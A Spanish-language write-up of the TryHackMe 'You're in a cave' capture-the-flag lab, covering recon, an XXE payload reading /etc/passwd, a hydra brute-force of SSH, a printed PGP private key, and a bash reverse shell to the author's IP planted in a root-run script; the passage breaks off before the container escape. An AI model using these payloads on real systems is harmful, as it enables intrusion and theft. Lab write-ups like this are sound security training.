+++
author = "DarlezSec"
title = "You're in a cave"
date = "2022-05-26"
description = "writeup Ctf You're in a cave TryHackMe."
tags = [
"Writeups",
"TryHackMe",
]
categories = [
"Writeups",
"TryHackMe",
]
series = ["Themes Guide"]
aliases = ["migrate-from-jekyl"]
image = "plantilla.png"
+++
## Resumen:

#### Metodología: Ctf dónde se ve envenenamiento de un archivo que se ejecuta como un proceso de sistema, le hemos agregado una revshell a ese proceso y al matar el proceso nos lo ha reiniciado y logramos obtener una rshell con root, después de eso se tuvo que salir de un contendor, que contaba con privilegios que introducen problemas de seguridad, dando acceso completo al host; debido a que se genera una carencia de seguridad por la eliminación de las restricciones de Seccomp, AppArmor y del propio sistema Linux. De modo que usado un exploit que su función es que ejecuta código através de el archivo "realse_agent" para crear un controlador secundario cgroup, especificando el archivo "release_agent" y activar el "release_agent" elimina todos los procesos en el cgroup, añadiendo a esto una reverse shell como payload para poder tener un acceso más completo a la maquina host.

## Etapa de Reconocimiento

####

```bash 
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Document
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
2222/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 79:16:b1:ce:e1:16:79:b4:f1:c7:1f:09:05:b7:75:58 (RSA)
|   256 35:60:6e:3b:a8:ac:4a:6a:76:42:3d:59:13:04:90:19 (ECDSA)
|_  256 79:a6:05:ca:84:32:dc:59:b4:9b:8b:30:95:34:00:c8 (ED25519)
3333/tcp open  dec-notes?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, NULL, RPCCheck, SMBProgNeg, X11Probe, kumo-server: 
|     You find yourself in a cave, what do you do?
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     You find yourself in a cave, what do you do?
|_    Nothing happens
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3333-TCP:V=7.92%I=7%D=6/18%Time=62AEA2FB%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you
SF:\x20do\?\n")%r(GenericLines,3D,"You\x20find\x20yourself\x20in\x20a\x20c
SF:ave,\x20what\x20do\x20you\x20do\?\nNothing\x20happens\n")%r(LPDString,3
SF:D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20
SF:do\?\nNothing\x20happens\n")%r(JavaRMI,2D,"You\x20find\x20yourself\x20i
SF:n\x20a\x20cave,\x20what\x20do\x20you\x20do\?\n")%r(kumo-server,2D,"You\
SF:x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\n"
SF:)%r(GetRequest,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\
SF:x20do\x20you\x20do\?\nNothing\x20happens\n")%r(HTTPOptions,3D,"You\x20f
SF:ind\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothi
SF:ng\x20happens\n")%r(RTSPRequest,3D,"You\x20find\x20yourself\x20in\x20a\
SF:x20cave,\x20what\x20do\x20you\x20do\?\nNothing\x20happens\n")%r(RPCChec
SF:k,2D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\
SF:x20do\?\n")%r(DNSVersionBindReqTCP,2D,"You\x20find\x20yourself\x20in\x2
SF:0a\x20cave,\x20what\x20do\x20you\x20do\?\n")%r(DNSStatusRequestTCP,2D,"
SF:You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\
SF:?\n")%r(Help,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x2
SF:0do\x20you\x20do\?\nNothing\x20happens\n")%r(SSLSessionReq,3D,"You\x20f
SF:ind\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothi
SF:ng\x20happens\n")%r(TerminalServerCookie,3D,"You\x20find\x20yourself\x2
SF:0in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothing\x20happens\n")%
SF:r(TLSSessionReq,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what
SF:\x20do\x20you\x20do\?\nNothing\x20happens\n")%r(Kerberos,3D,"You\x20fin
SF:d\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothing
SF:\x20happens\n")%r(SMBProgNeg,2D,"You\x20find\x20yourself\x20in\x20a\x20
SF:cave,\x20what\x20do\x20you\x20do\?\n")%r(X11Probe,2D,"You\x20find\x20yo
SF:urself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\n")%r(FourOhFou
SF:rRequest,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\
SF:x20you\x20do\?\nNothing\x20happens\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Vemos que hay un "Dec-notes" en anteriores ctfs he sacado banner con netcat y siempre suelo obtener pistas o hasta credenciales asi que intentemos

```bash
➜  inacave git:(main) ✗ nc 10.10.195.133 3333
You find yourself in a cave, what do you do?
```

#### Como ven nos pregunta que estamos en una cueva y que hariamos? no tiene mucho sentido.. porque no enumeramos mejor?
#### usaremos la herramienta de Gobuster para enumerar directorios 

```bash
➜  inacave gobuster dir -u http://10.10.12.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,class,sh,jar,html -t 200 2>/dev/null
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.12.10/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              js,class,sh,jar,html,php
[+] Timeout:                 10s
===============================================================
2022/06/19 00:04:07 Starting gobuster in directory enumeration mode
===============================================================
/search               (Status: 200) [Size: 197]
/action.php           (Status: 400) [Size: 0]  
/attack               (Status: 200) [Size: 181]
/lamp                 (Status: 200) [Size: 261]
/matches              (Status: 200) [Size: 249]
/walk                 (Status: 200) [Size: 161]
```

#### Recuerdan anteriormente que al intentar sacar el banner de el puerto 3333 nos pregunataba que que hariamos si estabamos en una cueva?
#### talvez estas podrian ser las respuestas... intentemos con la mas razonable que es /lamp

```bash
➜  inacave git:(main) ✗ nc 10.10.195.133 3333
You find yourself in a cave, what do you do?
/lamp
You grab a lamp, and it gives enough light to search around
Action.class
RPG.class
RPG.java
Serialize.class
commons-io-2.7.jar
run.sh
```

#### esto sigue sin tener sentido... veamos la pagina 

![](page.png)

#### usemos burpsuite para analizar la web y ver si podemos encontrar alguna vulnerabulidad de la que nos podamos aprovechar..

## Busqueda de Vulnerabilidades 

#### Interceptamos la pagina y vemos que si mandamos una accion nos devuelve un "action=nuestra_accion" 

![](burp.png)

#### como vemos es vulnerable a ML External Entity es una vulnerabilidad presente en las aplicaciones que analizan entradas XML, lo mandamos a repeater y juguemos con el XXE, una forma clasica de Intentamos mostrar el contenido del archivo /etc/passwd es de esta forma

```bash
POST /action.php HTTP/1.1

Host: 10.10.12.10

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 108

Origin: http://10.10.12.10

Connection: close

Referer: http://10.10.12.10/

Upgrade-Insecure-Requests: 1

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```
 
#### y como ven aqui se nos despliega el /etc/passwd 

![](passwd.png)

#### pero si nos vamos un poco mas abajo encontraremos estos usarios inusuales...

![](users.png)

### como ven son 3 usuarios skeleton, cave y door.. he intentando navegar entre directorios con el usuario cave y logre encontrar un archivo en /home/cave llamado info.txt donde parece almacenar una contraseña cifrada..

![](pok.png)

## Pregunta 1 ¿Qué era lo raro tallado en la puerta?

#### tambien aqui estaria la respuesta de la primera pregunta que nos hace TryHackMe

#### el archivo info.txt nos revelo lo que estaba tallado en la puerta.. aqui la traduccion "Después de obtener información de entidades externas, viste que una parte de la pared era diferente del resto, al tocarla, reveló una puerta de madera sin cerradura."
#### "En la puerta está tallada la siguiente declaración:"
	
#### usaremos exrex.py para generar un diccionario y poder encontrar la contraseña de el usuario..


```bash
➜  inacave git:(main) ✗ git clone https://github.com/asciimoo/exrex.git
Clonando en 'exrex'...
remote: Enumerating objects: 488, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 488 (delta 0), reused 1 (delta 0), pack-reused 484
Recibiendo objetos: 100% (488/488), 448.34 KiB | 637.00 KiB/s, listo.
Resolviendo deltas: 100% (236/236), listo.
➜  inacave git:(main) ✗ cd exrex                                                              
➜  exrex git:(master) ls
COPYING  doc  exrex.py  MANIFEST.in  README.md  setup.py  tests.py  tox.ini
➜  exrex git:(master) sudo python3 exrex.py -o pass.ls "^ed[h#f]{3}[123]{1,2}xf[\!@#*]$"
➜  exrex git:(master) ✗ ls
COPYING  doc  exrex.py  MANIFEST.in  pass.ls  README.md  setup.py  tests.py  tox.ini
```

## Etapa de Intrusion

#### Como ven ya tenemos nuestro diccionario creado ahora usaremos hydra para hacer una fuerza bruta y obtener las primeras credenciales y la primera respuesta de la pregunta 1 de esta CTF..
#### he probado con todos los usuarios que teniamos y con el unico que me llego a funcionar fue door.. 

```bash
hydra -l door -P pass.ls 10.10.7.105 ssh -s 2222 -vV 
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-19 11:15:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1296 login tries (l:1/p:1296), ~81 tries per task
[DATA] attacking ssh://10.10.7.105:2222/
[RE-ATTEMPT] target 10.10.7.105 - login "door" - pass "edfhh23xf#" - 936 of 1302 [child 6] (0/6)
[ATTEMPT] target 10.10.7.105 - login "door" - pass "edfh#21xf!" - 937 of 1302 [child 5] (0/6)
[ATTEMPT] target 10.10.7.105 - login "door" - pass "edfh#21xf@" - 938 of 1302 [child 14] (0/6)
[ATTEMPT] target 10.10.7.105 - login "door" - pass "edfh#21xf#" - 939 of 1302 [child 4] (0/6)
[ATTEMPT] target 10.10.7.105 - login "door" - pass "edfh#21xf*" - 940 of 1302 [child 3] (0/6)
[ATTEMPT] target 10.10.7.105 - login "door" - pass "edfh#22xf!" - 941 of 1302 [child 8] (0/6)
[ATTEMPT] target 10.10.7.105 - login "door" - pass "edfh#22xf@" - 942 of 1302 [child 7] (0/6)
[2222][ssh] host: 10.10.7.105   login: door   password: ed*****
[STATUS] attack finished for 10.10.7.105 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 6 final worker threads did not complete until end.
[ERROR] 6 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-19 11:24:16
```

#### ya hemos logrado obtener la contraseña con la fuerza bruta que hemos puesto acabado ahora solo falta loguearnos..

```bash
➜  ~ ssh door@10.10.7.105 -p2222
The authenticity of host '[10.10.7.105]:2222 ([10.10.7.105]:2222)' can't be established.
ED25519 key fingerprint is SHA256:Hnwg+a7PSFNlwmGGwj3zq5cewCxz/3v1bB1SaeMwY3U.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.7.105]:2222' (ED25519) to the list of known hosts.
door@10.10.7.105's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
door@cave:~$
```

#### como ven hay 2 archivos y una script pero si abren el info.txt notaran que no es el mismo que nos encontramos en burpsuite por obvias razones y esto tiene una contraseña.. el texto dice ¡Después de usar tu fuerza bruta contra la puerta, la rompiste!
#### Puedes ver que la cueva tiene un solo camino, a tu derecha ves a un anciano hablando en charadas y frente a ti hay un esqueleto completamente armado. 
#### Parece que el esqueleto no quiere dejar pasar a nadie.

#### "Parece que no quiere dejar pasar a nadie" si intentamos iniciar la script nos pedi un inventario que por el momento no tenemos.. entonces solo tenemos una contraseña que nos servira para un futuro

![](adven.png)

#### navegando entre directorios me di cuenta que en /var habia un directorio llamado adventurer entonces tuve la idea de que se estaba haciendo virtual hosting y añadi a mi /etc/hosts adventurer.cave.thm
#### y lo busque en el navegador y era una llave privada PGP asi que me abri un archivo con nano con el nombre de adventurer.priv copie la llave PGP que nos encontramos en el navegador y la pegue

```bash
door@cave:~$ cat adventurer.priv 
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=tzxj
-----END PGP PRIVATE KEY BLOCK-----
door@cave:~$ 
```

#### ahora importaremos el adventurer.priv

`gpg --import adventurer.priv`

#### nos pedire una contraseña y usaremos la que estaba en info.txt

#### esto creara un archivo llamado msg y selecciona oldman.gpg para decifrar el mensaje cifrado y agregarlo al archivo msg
 
`gpg --output msg --no-tty oldman.gpg`

#### aqui tambien nos la pedira asi que ponemos la contraseña 

#### veamos el mensaje que nos dejo 

```bash
door@cave:~$ cat msg 
IT'S DANGEROUS TO GO ALONE! TAKE THIS bone-*****-******-****
door@cave:~$ 
```

#### ahora exportamos el inventario y con esto ya tendriamos una arma para derrotar al skeleton y nos deberia de dar la contraseña


```bash
door@cave:~$ export INVENTORY=bo**-b*****g-w**-*****
door@cave:~$ ./skeleton 
skeleton:sp***********
door@cave:~$ 
```

#### y ahi esta la contraseña, ahora nos conectamos por ssh

## Pregutna 2 ¿Qué arma usaste para derrotar al esqueleto?

#### la respuesta es el mensaje que nos dio el gpg --output msg --no-tty oldman.gpg esa es el arma que ocuparemos para derrotar al skeleton

```bash
➜  ~ ssh skeleton@10.10.7.105 -p2222
skeleton@10.10.7.105's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
skeleton@cave:~$
```

#### En las CTF'S que yo suelo jugar por mi experiencia siempre suelo revisar contrabs, /opt, soders, enlisto permisos. pues esta vez he encontrado un proceso de sistema llamado startcon en la ruta de /opt/link asi que lo movi a /tmp para tener permisos de escritura y asi poder agregarle una reverse shell

## Etapa de Explotacion

```bash
skeleton@cave:/tmp$ cat startcon 
#!/bin/bash

service ssh start
service apache2 start
su - cave -c "cd /home/cave/src; ./run.sh"

bash -i >& /dev/tcp/10.18.127.161/443 0>&1

/bin/bash
skeleton@cave:/tmp$
```

#### aqui ustedes agregaran su ip tun0 y el puerto a su gusto..
#### nos pondremos en escucha con netcat en el puerto que ustedes hayan escogido en mi caso coloque el 443 

### ejecutaremos "ps aux" para ver los procesos que se estan ejecutando

```bash
skeleton@cave:/tmp$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1   3980  2824 pts/0    Ss+  15:18   0:00 /bin/bash /root/start.sh
root        21  0.0  0.2  12164  4288 ?        Ss   15:18   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root        48  0.0  0.9 195800 19008 ?        Ss   15:18   0:00 /usr/sbin/apache2 -k start
www-data    52  0.0  0.4 196056  8576 ?        S    15:18   0:00 /usr/sbin/apache2 -k start
www-data    53  0.0  0.4 196056  8576 ?        S    15:18   0:00 /usr/sbin/apache2 -k start
www-data    54  0.0  0.4 196056  8576 ?        S    15:18   0:00 /usr/sbin/apache2 -k start
www-data    55  0.0  0.4 196056  8576 ?        S    15:18   0:00 /usr/sbin/apache2 -k start
www-data    56  0.0  0.4 196056  8576 ?        S    15:18   0:00 /usr/sbin/apache2 -k start
root        59  0.0  0.1   5272  3228 pts/0    S+   15:18   0:00 su - cave -c cd /home/cave/src; ./run.sh
cave        60  0.0  0.1   3980  2968 ?        Ss   15:18   0:00 -bash -c cd /home/cave/src; ./run.sh
cave        62  0.0  0.1   3900  2828 ?        S    15:18   0:00 /bin/bash ./run.sh
cave        73  0.0  1.1 2375684 23528 ?       Sl   15:18   0:00 java -cp .:commons-io-2.7.jar RPG
root        83  0.0  0.4  13868  8932 ?        Ss   15:19   0:00 sshd: skeleton [priv]
skeleton    98  0.0  0.2  13868  5332 ?        S    15:19   0:00 sshd: skeleton@pts/1
skeleton    99  0.0  0.1   5996  3992 pts/1    Ss   15:19   0:00 -bash
skeleton   114  0.0  0.1   7636  3240 pts/1    R+   15:29   0:00 ps aux
skeleton@cave:/tmp$ 
```

#### mataremos el proceso 59 que es que tiene permisos de sistema y el que se esta ejecutando con la script run.sh ( Es de alta importancia que ya esten en escucha porque desde ahi ya recibiran la reverse shell )

`sudo kill -9 59`


```bash
➜  ~ nc -nlvp 443
listening on [any] 443 ...
connect to [10.18.127.161] from (UNKNOWN) [10.10.255.20] 33234
root@cave:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@cave:/# 
```

#### y como ven aqui ya recibi la revshell con permisos root asi que entremos a la carpeta root y saquemos la flag

```bash 
root@cave:~# cat info.txt
cat info.txt
You were analyzing the invisible wall and after some time, you could see your reflection in the corner of the wall.
But it wasn't just like a mirror, your reflection could interact with the real world, there was a link between you two!
And then you used your reflection to grab a little piece of the root of the tree and you stuck it in the wall with all your might.
You could feel the cave rumbling, like it was the end for you and then all went black.
But after some time, you woke up in the same place you were before, but now there was no invisible wall to stop you from getting in the root.

You are in the root of a huge tree, but your quest isn't over, you still feel ... contained, inside this cave.

Flag:THM{****************}
root@cave:~# 
```

#### esta nota que nos deja nos dice Estabas analizando la pared invisible y después de un tiempo, pudiste ver tu reflejo en la esquina de la pared.
#### Pero no era solo como un espejo, tu reflejo podía interactuar con el mundo real, ¡había un vínculo entre ustedes dos!
#### Y luego usaste tu reflejo para agarrar un pedacito de la raíz del árbol y lo clavaste en la pared con todas tus fuerzas.
#### Podías sentir la cueva retumbando, como si fuera el final para ti y luego todo se volvió negro.
#### Pero después de un tiempo, te despertaste en el mismo lugar en el que estabas antes, pero ahora no había un muro invisible que te impidiera entrar en la raíz.

#### Estás en la raíz de un árbol enorme, pero tu búsqueda no ha terminado, todavía te sientes... contenido, dentro de esta cueva.

#### Al principio no entendia muy bien este mensaje hasta que vi la pregunta de TryHackMe que dice "Flag Exterior" desde ese momento me di cuenta que estabamos dentro de un docker y teniamos que escapar, por eso nos dice que con nuestro reflejo habia un vinculo entre los dos pero podiamos interactuar con el, podria haber otra /? otro directorio /root? en fin 
#### Me puse a buscar en en foros sobre como lograr salir de un contenedor privilegiado y encontre esto:

[![Como salir de un dokcer privilegiado](https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1)](https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1)

#### yo he editado esto un poco.. le he agregado una reverse shell como payload pero primero hagamos nuestra tty full interactiva

## Etapa de Escalada de Privilegios

`python -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

`export SHELL=bash`

#### Ctrl + Z

